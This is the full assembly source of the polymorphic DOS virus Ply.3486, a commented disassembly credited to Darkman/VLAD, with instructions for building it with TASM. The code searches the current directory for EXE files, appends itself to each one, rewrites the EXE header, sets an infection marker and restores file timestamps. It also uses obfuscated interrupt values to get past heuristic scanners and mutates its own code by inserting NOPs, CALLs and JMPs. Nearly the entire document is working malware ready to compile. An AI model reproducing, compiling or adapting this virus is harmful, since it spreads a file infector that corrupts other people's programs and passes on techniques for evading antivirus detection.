comment *
				Ply.3486
			     Disassembly by
			      Darkman/VLAD

  Ply.3486 is a 3486 bytes parasitic direct action EXE virus. Infects every
  file in current directory, when executed, by appending the virus to the
  infected file. Ply.3486 has anti-heuristic techniques and is polymorphic in
  file using its internal polymorphic engine.

  To compile Ply.3486 with Turbo Assembler v 4.0 type:
    TASM /m PLY_3486.ASM
    TLINK /t /x PLY_3486.OBJ
*

.model tiny
.code
 org   100h				 ; Origin of Ply.3486

code_begin:
delta_offset equ     $+01h		 ; Delta offset
	     mov     bp,100h		 ; BP = delta offset
poly_begin:
	     mov     ax,cs		 ; AX = code segment
	     nop
	     mov     ds,ax		 ; DS =  "      "
	     nop
	     mov     es,ax		 ; ES =  "      "
	     nop

	     mov     ax,100h		 ; AX = offset of beginning of code
	     sub     bp,ax		 ; Subtract offset of beginning of ...
	     nop

	     sti			 ; Set interrupt-enable flag
	     nop
	     nop
	     cld			 ; Clear direction flag
	     nop
	     nop

	     lea     si,poly_begin	 ; SI = offset of poly_begin
	     add     si,bp		 ; Add delta offset
	     nop
	     mov     cx,(poly_end-poly_begin)/03h
poly_loop:
	     in      al,40h		 ; AL = 8-bit random number
	     nop
	     and     al,00000111b	 ; AL = random number between zero ...
	     nop

	     push    cx 		 ; Save CX at stack
	     nop
	     nop
	     push    si 		 ; Save SI at stack
	     nop
	     nop

	     cmp     al,00h		 ; Prepend a NOP to the opcode?
	     nop
	     jne     test_append	 ; Not equal? Jump to test_append
	     nop

	     mov     al,[si]		 ; AL = first byte of three-bytes b...
	     nop
	     cmp     al,90h		 ; NOP (opcode 90h)?
	     nop
	     je      dont_poly		 ; Equal? Jump to dont_poly
	     nop

	     mov     al,[si+02h]	 ; AL = third byte of three-byte block
	     cmp     al,90h		 ; NOP (opcode 90h)
	     nop
	     jne     dont_poly		 ; Not equal? Jump to dont_poly
	     nop

	     mov     ax,[si]		 ; AX = first word of three-bytes b...
	     nop
	     lea     bx,poly_buffer	 ; BX = offset of poly_buffer
	     add     bx,bp		 ; Add delta offset
	     nop
	     mov     [bx+01h],ax	 ; Store first word of three-bytes ...

	     cmp     al,0ebh		 ; JMP imm8 (opcode 0ebh)
	     nop
	     je      dec_imm8		 ; Equal? Jump to dec_imm8
	     nop

	     and     al,11110000b
	     nop
	     cmp     al,70h		 ; Jump on condition?
	     nop
	     jne     prepend_nop	 ; Not equal? Jump to prepend_nop
	     nop
dec_imm8:
	     dec     byte ptr [bx+02h]	 ; Decrease 8-bit immediate
prepend_nop:
	     mov     al,90h		 ; NOP (opcode 90h)
	     nop
	     mov     [bx],al		 ; Prepend a NOP to the opcode
	     nop

	     mov     di,si		 ; DI = offset of current three-byt...
	     nop
	     mov     si,bx		 ; SI = offset of poly_buffer
	     nop
	     mov     cx,03h		 ; Move three bytes
	     rep     movsb		 ; Move three-bytes block to offset...
	     nop
dont_poly:
	     jmp     test_loop
test_append:
	     cmp     al,01h		 ; Append a NOP to the opcode?
	     nop
	     jne     test_create	 ; Not equal? Jump to test_create
	     nop

	     mov     al,[si]		 ; AL = first byte of three-bytes b...
	     nop
	     cmp     al,90h		 ; NOP (opcode 90h)?
	     nop
	     jne     dont_poly_ 	 ; Not equal? Jump to dont_poly_
	     nop

	     mov     ax,[si+01h]	 ; AX = second word of three-bytes ...
	     lea     bx,poly_buffer	 ; BX = offset of poly_buffer
	     add     bx,bp		 ; Add delta offset
	     nop
	     mov     [bx],ax		 ; Store second word of three-bytes...
	     nop

	     cmp     al,0ebh		 ; JMP imm8 (opcode 0ebh)
	     nop
	     je      dec_imm8_		 ; Equal? Jump to dec_imm8_
	     nop

	     and     al,11110000b
	     nop
	     cmp     al,70h		 ; Jump on condition?
	     nop
	     jne     append_nop 	 ; Not equal? Jump to append_nop
	     nop
dec_imm8_:
	     inc     byte ptr [bx+01h]	 ; Decrease 8-bit immediate
append_nop:
	     mov     al,90h		 ; NOP (opcode 90h)
	     nop
	     mov     [bx+02h],al	 ; Append a NOP to the opcode

	     mov     di,si		 ; DI = offset of current three-byt...
	     nop
	     mov     si,bx		 ; SI = offset of poly_buffer
	     nop
	     mov     cx,03h		 ; Move three bytes
	     rep     movsb		 ; Move three-bytes block to offset...
	     nop
dont_poly_:
	     jmp     test_loop
test_create:
	     cmp     al,02h		 ; Create a CALL imm16 to the opcode?
	     nop
	     jne     delete_call	 ; Not equal? Jump to delete_call
	     nop

	     mov     ax,[si]		 ; AX = first word of three-bytes b...
	     nop
	     cmp     al,90h		 ; NOP (opcode 90h)?
	     nop
	     jne     create_call	 ; Not equal? Jump to create_call
	     nop

	     mov     al,ah		 ; AL = second byte of three-bytes ...
	     nop
create_call:
	     cmp     al,0e9h		 ; JMP imm16 (opcode 0e9h)
	     nop
	     je      call_exit		 ; Equal? Jump to call_exit
	     nop
	     cmp     al,0e8h		 ; CALL imm16 (opcode 0e8h)
	     nop
	     je      call_exit		 ; Equal? Jump to call_exit
	     nop
	     cmp     al,0ebh		 ; JMP imm8 (opcode 0ebh)
	     nop
	     je      call_exit		 ; Equal? Jump to call_exit
	     nop
	     cmp     al,0c3h		 ; RET (opcode 0c3h)
	     nop
	     je      call_exit		 ; Equal? Jump to call_exit
	     nop

	     and     al,11110000b
	     nop
	     cmp     al,70h		 ; Jump on condition?
	     nop
	     je      call_exit		 ; Equal? Jump to call_exit
	     nop
	     cmp     al,50h		 ; PUSH reg16/POP reg16?
	     nop
	     je      call_exit		 ; Equal? Jump to call_exit
	     nop

	     call    get_poly_off

	     mov     cx,03h		 ; Move three bytes
	     rep     movsb		 ; Move three-bytes block to offset...
	     nop

	     mov     al,0c3h		 ; RET (opcode 0c3h)
	     nop
	     stosb			 ; Store RET
	     nop
	     nop

	     in      al,40h		 ; AL = 8-bit random number
	     nop
	     stosb			 ; Store 8-bit random number
	     nop
	     nop

	     in      al,40h		 ; AL = 8-bit random number
	     nop
	     stosb			 ; Store 8-bit random number
	     nop
	     nop

	     mov     al,0e8h		 ; CALL imm16 (opcode 0e8h)
	     nop
	     lea     bx,poly_buffer	 ; BX = offset of poly_buffer
	     add     bx,bp		 ; Add delta offset
	     nop
	     mov     [bx],al		 ; Create a CALL imm16 to the opcode
	     nop

	     mov     ax,di		 ; AX = random offset of polymorphi...
	     nop
	     sub     ax,si		 ; Subtract offset of current three...
	     nop
	     sub     ax,06h		 ; Subtract size of six-bytes block
	     mov     [bx+01h],ax	 ; Store 16-bit immediate

	     mov     di,si		 ; SI = offset of current three-byt...
	     nop
	     mov     ax,03h		 ; AX = size of opcode CALL imm16
	     sub     di,ax		 ; Subtract size of opcode CALL imm...
	     nop
	     mov     si,bx		 ; SI = offset of poly_buffer
	     nop
	     mov     cx,03h		 ; Move three bytes
	     rep     movsb		 ; Move three-bytes block to offset...
	     nop
call_exit:
	     jmp     test_loop
delete_call:
	     cmp     al,03h		 ; Delete previously created CALL i...
	     nop
	     jne     test_create_	 ; Not equal? Jump to test_create_
	     nop

	     mov     al,[si]		 ; AL = first byte of three-bytes b...
	     nop
	     cmp     al,0e8h		 ; CALL imm16 (opcode 0e8h)?
	     nop
	     jne     call_exit_ 	 ; Not equal? Jump to call_exit_
	     nop

	     mov     ax,[si+01h]	 ; AX = 16-bit immediate
	     add     ax,03h		 ; Add size of opcode CALL imm16

	     mov     di,si		 ; DI = offset of current three-byt...
	     nop
	     add     si,ax		 ; Add 16-bit immediate
	     nop
	     lea     bx,poly_blocks	 ; BX = offset of poly_blocks
	     add     bx,bp		 ; Add delta offset
	     nop
	     cmp     si,bx		 ; 16-bit immediate within polymorp...
	     nop
	     jb      call_exit_ 	 ; Below? Jump to call_exit_
	     nop

	     mov     cx,03h		 ; Move three bytes
	     rep     movsb		 ; Move three-bytes block to offset...
	     nop

	     mov     al,90h		 ; NOP (opcode 90h)
	     nop
	     mov     ah,al		 ; NOP; NOP (opcode 90h,90h)
	     nop
	     mov     [si-03h],ax	 ; Store NOP; NOP

	     in      al,40h		 ; AL = 8-bit random number
	     nop
	     mov     [si-01h],al	 ; Store 8-bit random number

	     in      al,40h		 ; AL = 8-bit random number
	     nop
	     mov     [si],al		 ; Store 8-bit random number
	     nop
call_exit_:
	     jmp     test_loop
test_create_:
	     cmp     al,04h		 ; Create a JMP imm16 to the opcode?
	     nop
	     jne     delete_jmp 	 ; Not equal? Jump to delete_jmp
	     nop

	     mov     ax,[si]		 ; AX = first word of three-bytes b...
	     nop
	     cmp     al,90h		 ; NOP (opcode 90h)?
	     nop
	     jne     create_jmp 	 ; Not equal? Jump to create_jmp
	     nop

	     mov     al,ah		 ; AL = second byte of three-bytes ...
	     nop
create_jmp:
	     cmp     al,0e9h		 ; JMP imm16 (opcode 0e9h)?
	     nop
	     je      jmp_exit		 ; Equal? Jump to jmp_exit
	     nop
	     cmp     al,0e8h		 ; CALL imm16 (opcode 0e8h)
	     nop
	     je      jmp_exit		 ; Equal? Jump to jmp_exit
	     nop
	     cmp     al,0ebh		 ; JMP imm8 (opcode 0ebh)
	     nop
	     je      jmp_exit		 ; Equal? Jump to jmp_exit
	     nop

	     and     al,11110000b
	     nop
	     cmp     al,70h		 ; Jump on condition?
	     nop
	     je      jmp_exit		 ; Equal? Jump to jmp_exit
	     nop

	     call    get_poly_off

	     mov     cx,03h		 ; Move three bytes
	     rep     movsb		 ; Move three-bytes block to offset...
	     nop

	     mov     al,0e9h		 ; JMP imm16 (opcode 0e9h)
	     nop
	     stosb			 ; Store JMP imm16
	     nop
	     nop

	     mov     ax,di		 ; AX = random offset of polymorphi...
	     nop
	     sub     ax,si		 ; Subtract offset of current three...
	     nop
	     neg     ax 		 ; Negate AX
	     nop
	     sub     ax,02h		 ; Subtract two from 16-bit immediate
	     stosw			 ; Store 16-bit immediate
	     nop
	     nop

	     mov     al,0e9h		 ; JMP imm16 (opcode 0e9h)
	     nop
	     lea     bx,poly_buffer	 ; BX = offset of poly_buffer
	     add     bx,bp		 ; Add delta offset
	     nop
	     mov     [bx],al		 ; Create a JMP imm16 to the opcode
	     nop

	     mov     ax,di		 ; AX = random offset of polymorphi...
	     nop
	     sub     ax,si		 ; Subtract offset of current three...
	     nop
	     sub     ax,06h		 ; Subtract size of six-bytes block
	     mov     [bx+01h],ax	 ; Store 16-bit immediate

	     mov     di,si		 ; SI = offset of current three-byt...
	     nop
	     mov     ax,03h		 ; AX = size of opcode CALL imm16
	     sub     di,ax		 ; Subtract size of opcode CALL imm...
	     nop
	     mov     si,bx		 ; SI = offset of poly_buffer
	     nop
	     mov     cx,03h		 ; Move three bytes
	     rep     movsb		 ; Move three-bytes block to offset...
	     nop
jmp_exit:
	     jmp     test_loop
	     nop
delete_jmp:
	     cmp     al,05h		 ; Delete previously created JMP im...
	     nop
	     jne     test_loop		 ; Not equal? Jump to test_loop
	     nop

	     mov     al,[si]		 ; AL = first byte of three-bytes b...
	     nop
	     cmp     al,0e9h		 ; JMP imm16 (opcode 0e9h)?
	     nop
	     jne     jmp_exit_		 ; Not equal? Jump to jmp_exit_
	     nop

	     mov     ax,[si+01h]	 ; AX = 16-bit immediate
	     add     ax,03h		 ; Add size of opcode CALL imm16

	     mov     di,si		 ; DI = offset of current three-byt...
	     nop
	     add     si,ax		 ; Add 16-bit immediate
	     nop
	     lea     bx,poly_blocks	 ; BX = offset of poly_blocks
	     add     bx,bp		 ; Add delta offset
	     nop
	     cmp     si,bx		 ; 16-bit immediate within polymorp...
	     nop
	     jb      jmp_exit_		 ; Below? Jump to jmp_exit_
	     nop

	     mov     cx,03h		 ; Move three bytes
	     rep     movsb		 ; Move three-bytes block to offset...
	     nop

	     mov     al,90h		 ; NOP (opcode 90h)
	     nop
	     mov     ah,al		 ; NOP; NOP (opcode 90h,90h)
	     nop
	     mov     [si-03h],ax	 ; Store NOP; NOP

	     in      al,40h		 ; AL = 8-bit random number
	     nop
	     mov     [si-01h],al	 ; Store 8-bit random number

	     in      al,40h		 ; AL = 8-bit random number
	     nop
	     mov     [si],al		 ; Store 8-bit random number
	     nop
jmp_exit_:
	     jmp     test_loop
	     nop
test_loop:
	     pop     si 		 ; Load SI from stack
	     nop
	     nop
	     pop     cx 		 ; Load CX from stack
	     nop
	     nop

	     mov     ax,03h		 ; AX = size of block
	     add     si,ax		 ; SI = offset of next three-byte b...
	     nop

	     dec     cx 		 ; Decrease CX
	     nop
	     nop
	     jz      poly_exit		 ; Zero? Jump to poly_exit
	     nop

	     jmp     poly_loop
poly_exit:
	     jmp     prepare_exit
	     nop

get_poly_off proc    near		 ; Get random offset of polymorphic...
	     in      al,40h		 ; AL = 8-bit random number
	     nop
	     mov     ah,al		 ; AH =   "     "      "
	     nop
	     in      al,40h		 ; AL = 8-bit random number
	     nop
	     mov     di,ax		 ; DI = 16-bit random number
	     nop
	     mov     ax,(poly_end-poly_begin)/03h
get_rnd_num:
	     sub     di,ax		 ; Subtract number of polymorphic b...
	     nop
	     cmp     di,ax		 ; Too large a 16-bit random number?
	     nop
	     jae     get_rnd_num	 ; Above or equal? Jump to get_rnd_num
	     nop

	     mov     ax,di		 ; AX = 16-bit random number within...
	     nop

	     add     di,ax		 ; Add number of polymorphic blocks
	     nop
	     add     di,ax		 ;  "    "    "       "        "
	     nop
	     add     di,ax		 ;  "    "    "       "        "
	     nop
	     add     di,ax		 ;  "    "    "       "        "
	     nop
	     add     di,ax		 ;  "    "    "       "        "
	     nop

	     lea     ax,poly_blocks	 ; AX = offset of poly_blocks
	     add     di,ax		 ; Add offset of poly_blocks to ran...
	     nop
	     add     di,bp		 ; Add delta offset
	     nop


	     mov     al,90h		 ; NOP (opcode 90h)
	     nop
	     mov     ah,al		 ; NOP; NOP (opcode 90h,90h)
	     nop
	     cmp     [di],ax		 ; Offset already in use?
	     nop
	     jne     get_poly_off	 ; Not equal? Jump to get_poly_off
	     nop

	     ret			 ; Return!
	     nop
	     nop
	     endp
prepare_exit:
	     lea     si,file_header	 ; SI = offset of file_header
	     add     si,bp		 ; Add delta offset
	     nop
	     lea     di,instruct_ptr	 ; SI = offset of instruct_ptr
	     add     di,bp		 ; Add delta offset
	     nop

	     mov     ax,[si+14h]	 ; AX = instruction pointer
	     stosw			 ; Store instruction pointer
	     nop
	     nop
	     mov     ax,[si+16h]	 ; AX = code segment
	     stosw			 ; Store code segment
	     nop
	     nop
	     mov     ax,[si+0eh]	 ; AX = stack segment
	     stosw			 ; Store stack segment
	     nop
	     nop
	     mov     ax,[si+10h]	 ; AX = stack pointer
	     stosw			 ; Store stack pointer
	     nop
	     nop

	     mov     ah,1ah		 ; Set disk transfer area address
	     nop
	     lea     dx,dta		 ; DX = offset of dta
	     add     dx,bp		 ; Add delta offset
	     nop
	     mov     di,dx		 ; DI = offset of dta
	     nop
	     int     21h
	     nop

	     mov     ax,(4e00h+2020h)	 ; Find first matching file
	     sub     ax,2020h
	     mov     cx,0000000000000111b
	     lea     dx,file_specifi	 ; DX = offset of file_specifi
	     add     dx,bp		 ; Add delta offset
	     nop

	     mov     bx,dx		 ; BX = offset of file_specifi
	     nop
	     mov     al,'E'
	     nop
	     mov     [bx+02h],al	 ; Correct the file specification
find_next:
	     int     21h
	     nop
	     jnc     open_file		 ; No error? Jump to open_file
	     nop

	     jmp     virus_exit
open_file:
	     mov     al,'V'
	     nop
	     mov     [bx+02h],al	 ; Correct the file specification

	     mov     ax,3d00h		 ; Open file (read)
	     lea     dx,filename	 ; DX = offset of filename
	     add     dx,bp		 ; Add delta offset
	     nop
	     int     21h
	     nop
	     xchg    bx,ax		 ; BX = file handle
	     nop
	     nop

	     mov     ah,3fh		 ; Read from file
	     nop
	     mov     dx,si		 ; DX = offset of file_header
	     nop
	     mov     cx,1ah		 ; Read twenty-six bytes
	     int     21h
	     nop

	     mov     ah,3eh		 ; Close file
	     nop
	     int     21h
	     nop

	     mov     ax,('ZM'+2020h)     ; EXE signature
	     sub     ax,2020h
	     cmp     [si],ax		 ; Found EXE signature?
	     nop
	     je      examine_file	 ; Equal? Jump to examine_file
	     nop

	     xchg    ah,al		 ; Exchange EXE signature
	     nop
	     cmp     [si],ax		 ; Found EXE signature?
	     nop
	     je      examine_file	 ; Equal? Jump to examine_file
	     nop
jmp_find_nxt:
	     mov     ax,(4f00h+2020h)	 ; Find next matching file
	     sub     ax,2020h

	     jmp     find_next
	     nop
examine_file:
	     mov     ax,2020h
	     cmp     [si+12h],ax	 ; Already infected?
	     je      jmp_find_nxt	 ; Equal? Jump to jmp_find_nxt
	     nop

	     mov     ax,(4301h+2020h)	 ; Set file attributes
	     sub     ax,2020h
	     xor     cx,cx		 ; CX = new file attributes
	     nop
	     lea     dx,filename	 ; DX = offset of filename
	     add     dx,bp		 ; Add delta offset
	     nop
	     int     21h
	     nop

	     mov     ax,(3d02h+2020h)	 ; Open file (read/write)
	     sub     ax,2020h
	     lea     dx,filename	 ; DX = offset of filename
	     add     dx,bp		 ; Add delta offset
	     nop
	     int     21h
	     nop
	     xchg    bx,ax		 ; BX = file handle
	     nop
	     nop

	     mov     ax,4202h		 ; Set current file position (EOF)
	     xor     cx,cx		 ; Zero CX
	     nop
	     xor     dx,dx		 ; Zero DX
	     nop
	     int     21h
	     nop

	     mov     ax,(4000h+2020h)	 ; Write to file
	     sub     ax,2020h
	     mov     cx,(code_end-code_begin)
	     lea     dx,code_begin	 ; DX = offset of code_begin
	     add     dx,bp		 ; Add delta offset
	     nop
	     int     21h
	     nop

	     mov     ax,[si+08h]	 ; AX = header size in paragraphs
	     mov     cl,04h		 ; Multiply by paragraphs
	     nop
	     shl     ax,cl		 ; AX = header size
	     nop
	     push    bx 		 ; Save BX at stack
	     nop
	     nop
	     xchg    ax,bx		 ; BX = header size
	     nop
	     nop

	     mov     ax,[di+1ah]	 ; AX = low-order word of filesize
	     mov     dx,[di+1ch]	 ; DX = high-order word of filesize
	     push    ax 		 ; Save AX at stack
	     nop
	     nop
	     push    dx 		 ; Save DX at stack
	     nop
	     nop

	     sub     ax,bx		 ; Subtract header size from filesize
	     nop
	     sbb     dx,00h		 ; Convert to 32-bit
	     mov     cx,10h
	     div     cx 		 ; Divide by paragraphs
	     nop
	     mov     [si+14h],dx	 ; Store instruction pointer
	     mov     [si+16h],ax	 ; Store code segment

	     lea     bx,delta_offset	 ; BX = offset of delta_offset
	     add     bx,bp		 ; Add delta offset
	     nop
	     mov     [bx],dx		 ; Store delta offset
	     nop

	     inc     ax 		 ; Increase AX
	     nop
	     nop
	     mov     [si+0eh],ax	 ; Store stack segment

	     mov     ax,(code_end-code_begin+100h)
	     add     dx,ax		 ; DX = stack pointer
	     nop
	     mov     [si+10h],dx	 ; Store stack pointer

	     mov     ax,2020h		 ; AX = infection mark
	     mov     [si+12h],ax	 ; Store infection mark

	     pop     dx 		 ; Load DX from stack
	     nop
	     nop
	     pop     ax 		 ; Load AX from stack
	     nop
	     nop
	     add     ax,(code_end-code_begin)
	     adc     dx,00h		 ; Convert to 32-bit

	     mov     cl,09h
	     nop
	     push    ax 		 ; Save AX at stack
	     nop
	     nop
	     shr     ax,cl		 ; Multiply by pages
	     nop
	     ror     dx,cl		 ;     "    "    "
	     nop
	     stc			 ; Set carry flag
	     nop
	     nop
	     adc     dx,ax		 ; DX = total number of 512-bytes p...
	     nop
	     pop     ax 		 ; Load AX from stack
	     nop
	     nop
	     and     ah,00000001b
	     mov     [si+04h],dx	 ; Store totalt number of 512-bytes...
	     mov     [si+02h],ax	 ; Number of bytes in last 512-byte...
	     pop     bx 		 ; Load BX from stack
	     nop
	     nop

	     mov     ax,4201h		 ; Set current file position (CFP)
	     mov     cx,-01h
	     mov     dx,-(code_end-delta_offset)
	     int     21h
	     nop

	     mov     ax,(4000h+2020h)	 ; Write to file
	     sub     ax,2020h
	     mov     cx,02h		 ; Write two bytes
	     lea     dx,delta_offset	 ; DX = offset of delta_offset
	     add     dx,bp		 ; Add delta offset
	     nop
	     int     21h
	     nop

	     mov     ax,4200h		 ; Set current file position (SOF)
	     xor     cx,cx		 ; Zero CX
	     nop
	     xor     dx,dx		 ; Zero DX
	     nop
	     int     21h
	     nop

	     mov     ax,(4000h+2020h)	 ; Write to file
	     sub     ax,2020h
	     mov     cx,1ah		 ; Write twenty-six bytes
	     mov     dx,si		 ; DX = offset of file_header
	     nop
	     int     21h
	     nop

	     mov     ax,(5701h-2020h)	 ; Set file's date and time
	     add     ax,2020h
	     mov     cx,[di+16h]	 ; CX = file time
	     mov     dx,[di+18h]	 ; DX = file date
	     int     21h
	     nop

	     mov     ah,3eh		 ; Close file
	     nop
	     int     21h
	     nop

	     mov     ax,(4301h+2020h)	 ; Set file attributes
	     sub     ax,2020h
	     mov     ch,00h		 ; Zero CH
	     nop
	     mov     cl,[di+15h]	 ; CL = file attribute
	     lea     dx,filename	 ; DX = offset of filename
	     add     dx,bp		 ; Add delta offset
	     nop
	     int     21h
	     nop

	     mov     ah,4fh		 ; Find next matching file
	     nop

	     jmp     find_next
virus_exit:
	     mov     ah,62h		 ; Get current PSP address
	     nop
	     int     21h
	     nop
	     mov     es,bx		 ; ES = segment of PSP for current ...
	     nop

	     mov     ax,bx		 ; AX =    "    "   "   "     "     "
	     nop
	     add     ax,10h		 ; AX = segment of beginning of code

	     lea     si,instruct_ptr	 ; SI = offset of instruct_ptr
	     add     si,bp		 ; Add delta offset
	     nop

	     add     [si+02h],ax	 ; Add segment of beginning of code...
	     add     ax,[si+04h]	 ; Add original stack segment to se...

	     cli			 ; Clear interrupt-enable flag
	     nop
	     nop
poly_end:
	     mov     sp,[si+06h]	 ; SP = stack pointer
	     mov     ss,ax		 ; SS = stack segment
	     sti			 ; Set interrupt-enable flag

	     mov     ds,bx		 ; DS = segment of PSP for current ...

	     db      0eah		 ; JMP imm32 (opcode 0eah)
instruct_ptr dw      ?			 ; Instruction pointer
code_seg     dw      ?			 ; Code segment

stack_seg    dw      ?			 ; Stack segment
stack_ptr    dw      ?			 ; Stack pointer

	     db      00h
file_specifi db      '*.VXE',00h         ; File specification
file_header  dw      0ah dup(?),00h,0fff0h,?
	     db      00h
poly_buffer  db      03h dup(?) 	 ; Polymorphic buffer
poly_blocks  db       (poly_end-poly_begin)/03h dup(90h,90h,04h dup(?))
code_end:
dta:
	     db      15h dup(?) 	 ; Used by DOS for find next-process
file_attr    db      ?			 ; File attribute
file_time    dw      ?			 ; File time
file_date    dw      ?			 ; File date
filesize     dd      ?			 ; Filesize
filename     db      0dh dup(?) 	 ; Filename
data_end:

end	     code_begin
